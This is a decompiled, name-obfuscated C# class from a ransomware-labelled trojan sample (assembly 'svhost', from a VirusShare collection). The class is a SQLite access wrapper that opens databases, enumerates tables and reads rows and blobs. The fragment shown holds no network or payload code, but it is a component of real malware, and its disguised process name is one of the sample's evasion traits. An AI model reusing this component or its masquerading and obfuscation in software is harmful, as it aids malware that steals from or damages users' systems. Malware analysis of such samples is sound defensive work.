// Decompiled with JetBrains decompiler
// Type: ddnNmUR7d6rtDN0EjMLeG5.2lRE1xN7BZsdt360
// Assembly: svhost, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0119CC5D-1340-40EA-8467-DBC66BD5FC91
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-e16f9ac0296e41c694601c072c3c0f3167b7359b444108a8e554f3529a3b0494.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace ddnNmUR7d6rtDN0EjMLeG5
{
  public class \u0032lRE1xN7BZsdt360
  {
    private const int SQL_OK = 0;
    private const int SQL_ROW = 100;
    private const int SQL_DONE = 101;
    private IntPtr lruuefyU6DNcrksSWemDy183;

    public \u0032lRE1xN7BZsdt360() => this.lruuefyU6DNcrksSWemDy183 = IntPtr.Zero;

    public \u0032lRE1xN7BZsdt360(string baseName) => this.XCFpzZgn9esTQamgSd1sy258(baseName);

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr ca2YPLJHaRG5OT239(IntPtr heap, uint flags, uint bytes);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr \u0036BgOCYhlDbRAgp240();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int qqpK9mhKlGopNl241(IntPtr str);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int b0XVJT00IEAuMR242(IntPtr fileName, out IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
    private static extern int xR7evjgJrWWsBl243(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
    private static extern int fApcbWaCeVRmop244(
      IntPtr database,
      IntPtr query,
      IntPtr callback,
      IntPtr arguments,
      out IntPtr errorr);

    [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
    private static extern IntPtr IK9Ezqcuy9Tt4r245(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int y1ZghFL7eojQHV246(
      IntPtr database,
      IntPtr query,
      int length,
      out IntPtr statement,
      out IntPtr tail);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int Ccn9UQ1HMhSb8L247(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int \u0031giHRI4dVB4JEA248(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr wLlJJhRmMKzdqR249(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int eIn6xZ6Y5BYYRp250(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int hL4bcqa0V9rQTF251(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double tx8DicZdeYcEuy252(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr GJLLqs50Gn1ZGd253(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr MeEG6quxtkGEq4254(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_bytes")]
    private static extern IntPtr x5ZyWCkcoGqrAsRLCivLq255(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
    private static extern IntPtr \u0030jwx338gq4L10tBos33SA256(
      IntPtr statement,
      int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int PXfFP2GHIo8EDxLt0SzbV257(IntPtr handle);

    public void XCFpzZgn9esTQamgSd1sy258(string baseName)
    {
      if (\u0032lRE1xN7BZsdt360.b0XVJT00IEAuMR242(this.MswY7vvIkFoOl4NCENOWU265(baseName), out this.lruuefyU6DNcrksSWemDy183) != 0)
      {
        this.lruuefyU6DNcrksSWemDy183 = IntPtr.Zero;
        throw new Exception("Error with opening database " + baseName + "!");
      }
    }

    public void HGCnnWPUsauGERlzfg3qk259()
    {
      if (!(this.lruuefyU6DNcrksSWemDy183 != IntPtr.Zero))
        return;
      \u0032lRE1xN7BZsdt360.xR7evjgJrWWsBl243(this.lruuefyU6DNcrksSWemDy183);
    }

    public ArrayList y9GLMnpc7FyJmfV22c2qs260()
    {
      DataTable dataTable = this.lvWXhCpxd30ZSR4JzA4pv262("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
      ArrayList arrayList = new ArrayList();
      try
      {
        foreach (DataRow row in dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return arrayList;
    }

    public void H4Xcci0GDXY2d9xVBAzpI261(string query)
    {
      IntPtr errorr;
      \u0032lRE1xN7BZsdt360.fApcbWaCeVRmop244(this.lruuefyU6DNcrksSWemDy183, this.MswY7vvIkFoOl4NCENOWU265(query), IntPtr.Zero, IntPtr.Zero, out errorr);
      if (errorr != IntPtr.Zero)
        throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.oAZ0xvLFYMazJDqr4dMWu266(\u0032lRE1xN7BZsdt360.IK9Ezqcuy9Tt4r245(errorr)));
    }

    public DataTable lvWXhCpxd30ZSR4JzA4pv262(string query)
    {
      IntPtr statement;
      \u0032lRE1xN7BZsdt360.y1ZghFL7eojQHV246(this.lruuefyU6DNcrksSWemDy183, this.MswY7vvIkFoOl4NCENOWU265(query), this.mSdfCqmbAz1ZqHfTOHIKV268(this.MswY7vvIkFoOl4NCENOWU265(query)), out statement, out IntPtr _);
      DataTable table = new DataTable();
      int num = this.uHAH96o7qBt0Kmz1eUGA9263(statement, ref table);
      while (num == 100)
        num = this.qTX2lisc20u0cQNmg8v1q264(statement, ref table);
      \u0032lRE1xN7BZsdt360.PXfFP2GHIo8EDxLt0SzbV257(statement);
      return table;
    }

    private int uHAH96o7qBt0Kmz1eUGA9263(IntPtr statement, ref DataTable table)
    {
      table = new DataTable("resultTable");
      if (\u0032lRE1xN7BZsdt360.Ccn9UQ1HMhSb8L247(statement) == 100)
      {
        int num1 = \u0032lRE1xN7BZsdt360.\u0031giHRI4dVB4JEA248(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          string columnName = this.oAZ0xvLFYMazJDqr4dMWu266(\u0032lRE1xN7BZsdt360.wLlJJhRmMKzdqR249(statement, columnNumber));
          int num3 = \u0032lRE1xN7BZsdt360.eIn6xZ6Y5BYYRp250(statement, columnNumber);
          if (num3 == Conversion.Fix(1))
          {
            table.Columns.Add(columnName, Type.GetType("System.Int32"));
            objArray[columnNumber] = (object) \u0032lRE1xN7BZsdt360.hL4bcqa0V9rQTF251(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(2))
          {
            table.Columns.Add(columnName, Type.GetType("System.Single"));
            objArray[columnNumber] = (object) \u0032lRE1xN7BZsdt360.tx8DicZdeYcEuy252(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(3))
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) this.oAZ0xvLFYMazJDqr4dMWu266(\u0032lRE1xN7BZsdt360.GJLLqs50Gn1ZGd253(statement, columnNumber));
          }
          else if (num3 == Conversion.Fix(4))
          {
            table.Columns.Add(columnName, Type.GetType("System.Array"));
            int siz = (int) \u0032lRE1xN7BZsdt360.x5ZyWCkcoGqrAsRLCivLq255(statement, columnNumber);
            objArray[columnNumber] = (object) this.Hl6cQM0JCkG4voSxYAZK2267(\u0032lRE1xN7BZsdt360.MeEG6quxtkGEq4254(statement, columnNumber), siz);
          }
          else
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) "";
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
      }
      return \u0032lRE1xN7BZsdt360.Ccn9UQ1HMhSb8L247(statement);
    }

    private int qTX2lisc20u0cQNmg8v1q264(IntPtr statement, ref DataTable table)
    {
      int num1;
      try
      {
        int num2 = \u0032lRE1xN7BZsdt360.\u0031giHRI4dVB4JEA248(statement);
        object[] objArray = new object[checked (num2 - 1 + 1)];
        int num3 = checked (num2 - 1);
        int columnNumber = 0;
        while (columnNumber <= num3)
        {
          int num4 = \u0032lRE1xN7BZsdt360.eIn6xZ6Y5BYYRp250(statement, columnNumber);
          if (num4 == Conversion.Fix(1))
            objArray[columnNumber] = (object) \u0032lRE1xN7BZsdt360.hL4bcqa0V9rQTF251(statement, columnNumber);
          else if (num4 == Conversion.Fix(2))
            objArray[columnNumber] = (object) \u0032lRE1xN7BZsdt360.tx8DicZdeYcEuy252(statement, columnNumber);
          else if (num4 == Conversion.Fix(3))
            objArray[columnNumber] = (object) this.oAZ0xvLFYMazJDqr4dMWu266(\u0032lRE1xN7BZsdt360.GJLLqs50Gn1ZGd253(statement, columnNumber));
          else if (num4 == Conversion.Fix(4))
          {
            int siz = (int) \u0032lRE1xN7BZsdt360.x5ZyWCkcoGqrAsRLCivLq255(statement, columnNumber);
            objArray[columnNumber] = (object) this.Hl6cQM0JCkG4voSxYAZK2267(\u0032lRE1xN7BZsdt360.MeEG6quxtkGEq4254(statement, columnNumber), siz);
          }
          else
            objArray[columnNumber] = (object) "";
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        num1 = \u0032lRE1xN7BZsdt360.Ccn9UQ1HMhSb8L247(statement);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num1;
    }

    private IntPtr MswY7vvIkFoOl4NCENOWU265(string str)
    {
      if (str == null)
        return IntPtr.Zero;
      byte[] bytes1 = Encoding.UTF8.GetBytes(str);
      int bytes2 = checked (bytes1.Length + 1);
      IntPtr num = \u0032lRE1xN7BZsdt360.ca2YPLJHaRG5OT239(\u0032lRE1xN7BZsdt360.\u0036BgOCYhlDbRAgp240(), 0U, checked ((uint) bytes2));
      Marshal.Copy(bytes1, 0, num, bytes1.Length);
      Marshal.WriteByte(num, bytes1.Length, (byte) 0);
      return num;
    }

    private string oAZ0xvLFYMazJDqr4dMWu266(IntPtr ptr)
    {
      if (ptr == IntPtr.Zero)
        return (string) null;
      Encoding utF8 = Encoding.UTF8;
      int num = this.mSdfCqmbAz1ZqHfTOHIKV268(ptr);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      Marshal.Copy(ptr, numArray, 0, num);
      return utF8.GetString(numArray, 0, num);
    }

    private Array Hl6cQM0JCkG4voSxYAZK2267(IntPtr ptr, int siz)
    {
      if (ptr == IntPtr.Zero)
        return (Array) null;
      Encoding utF8 = Encoding.UTF8;
      this.mSdfCqmbAz1ZqHfTOHIKV268(ptr);
      byte[] destination = new byte[checked (siz - 1 + 1)];
      Marshal.Copy(ptr, destination, 0, siz);
      return (Array) destination;
    }

    private int mSdfCqmbAz1ZqHfTOHIKV268(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : \u0032lRE1xN7BZsdt360.qqpK9mhKlGopNl241(ptr);

    public enum \u0032LF55GDDaShZ70qJKnbNg61
    {
      INT = 1,
      FLOAT = 2,
      TEXT = 3,
      BLOB = 4,
      NULL = 5,
    }
  }
}
